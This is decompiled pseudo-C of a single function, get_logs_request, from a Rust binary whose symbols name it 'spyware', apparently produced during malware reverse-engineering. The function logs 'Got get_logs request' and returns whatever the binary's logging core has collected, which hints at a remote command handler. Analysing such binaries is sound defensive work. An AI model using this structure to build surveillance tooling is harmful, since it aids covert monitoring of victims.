undefined8 *
_ZN7spyware7actions11log_actions16get_logs_request17h84eb7739ff3a4934E(undefined8 *param_1)

{
  ulong uVar1;
  char *local_78;
  undefined8 uStack_70;
  char *local_68;
  undefined8 local_60;
  undefined8 local_58;
  undefined **local_50;
  undefined8 uStack_48;
  undefined8 local_40;
  undefined8 local_38;
  undefined8 uStack_30;
  undefined8 local_20;
  undefined8 uStack_18;
  undefined8 local_10;
  
  uVar1 = _ZN4core4sync6atomic11atomic_load17h8c88032dab18ab12E
                    (PTR__ZN3log20MAX_LOG_LEVEL_FILTER17h115edbfc95f53bc0E_001be5f8,0);
  if (3 < uVar1) {
    local_50 = &PTR_s_Got_get_logs_request__001b99d8;
    uStack_48 = 1;
    local_40 = 8;
    local_38 = 0;
    uStack_30 = 0;
    local_58 = (*(code *)PTR__ZN3log13__private_api3loc17he75f2f86c1ff97b9E_001be620)
                         (&PTR_s_src_actions_log_actions_rs_001b99f8);
    local_78 = "spyware::actions::log_actions";
    uStack_70 = 0x1d;
    local_68 = "spyware::actions::log_actions";
    local_60 = 0x1d;
    _ZN3log13__private_api3log17h13afddf373bd7d7fE(&local_50,4,&local_78);
  }
  _ZN7spyware7logging4core8get_logs17h979297f7bb1c44d2E(&local_20);
  param_1[2] = local_10;
  *param_1 = local_20;
  param_1[1] = uStack_18;
  param_1[3] = 0x8000000000000000;
  return param_1;
}